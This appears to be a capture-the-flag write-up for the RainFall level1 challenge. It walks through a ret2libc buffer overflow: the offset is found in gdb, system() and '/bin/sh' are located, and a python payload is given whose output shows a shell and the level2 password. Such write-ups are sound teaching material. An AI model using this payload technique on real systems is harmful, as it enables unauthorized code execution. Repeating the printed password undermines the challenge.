With gdb, with can try to verify the length of the buffer.
To do so, we run `gbd ./level01` and we write 76 characters. 

> (gdb) run
> The program being debugged has been started already.
> Start it from the beginning? (y or n) y
> Starting program: /home/user/level1/level1 
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> Program received signal SIGILL, Illegal instruction.
> 0xb7e45400 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6  

There is already an issue due to the `null byte` at the end of a string while we use `gets`.
So if we want to use the buffer overflow, we must give a buffer of 76 characters.
Secondly, we must not close the prompt, so a simple execution of a python script won't work. To keep the prompt open, we will use the following command :

```bash
cat <(cmd) - | ./level1
```

There is two ways to exploit a buffer overflow. Either by using a shell-code and rewrite the eip address. Or we can change the stack directly so it will do what we want.
We will go with the second option.
To do so, we need to find the location of the function `system` and find the string `/bin/sh` with gdb :

```assembly
(gdb) disass system
Dump of assembler code for function system:
   0xb7e6b060 <+0>:	sub    $0x1c,%esp
```

```assembly
(gdb) find &system,+9999999,"/bin/sh"
0xb7f8cc58
```

We just need to put whatever we want as the return address of the function. And we are good to go :

> level1@RainFall:~$ cat <(python -c 'print "A" * 76 + "\x60\xb0\xe6\xb7" + "IDGB" + "\x58\xcc\xf8\xb7"') - | ./level1 
> whoami
> level2
> cat /home/user/level2/.pass
> 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

```bash
su level2
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

